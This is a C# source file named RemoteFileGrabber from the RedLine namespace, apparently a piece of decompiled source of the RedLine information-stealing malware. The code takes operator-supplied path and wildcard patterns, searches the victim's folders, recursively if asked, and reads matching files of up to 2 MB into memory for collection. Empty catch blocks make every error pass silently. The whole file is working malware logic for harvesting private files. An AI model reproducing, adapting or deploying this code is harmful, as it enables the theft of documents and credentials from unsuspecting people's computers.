using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace RedLine.Logic.Others
{
	public static class RemoteFileGrabber
	{
		public static IList<RemoteFile> ParseFiles(IEnumerable<string> patterns)
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				foreach (string pattern in patterns)
				{
					try
					{
						string[] array = pattern.Split(new string[1]
						{
							"|"
						}, StringSplitOptions.RemoveEmptyEntries);
						if (array != null && array.Length == 3)
						{
							string path = Environment.ExpandEnvironmentVariables(array[0]);
							string searchPattern = array[1];
							string a = array[2];
							foreach (string item in Directory.EnumerateFiles(path, searchPattern, (a == "1") ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly))
							{
								try
								{
									FileInfo fileInfo = new FileInfo(item);
									if (fileInfo.Exists && fileInfo.Length <= 2097152)
									{
										list.Add(new RemoteFile
										{
											FileName = fileInfo.Name,
											Body = File.ReadAllBytes(item),
											SourcePath = item
										});
									}
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
	}
}
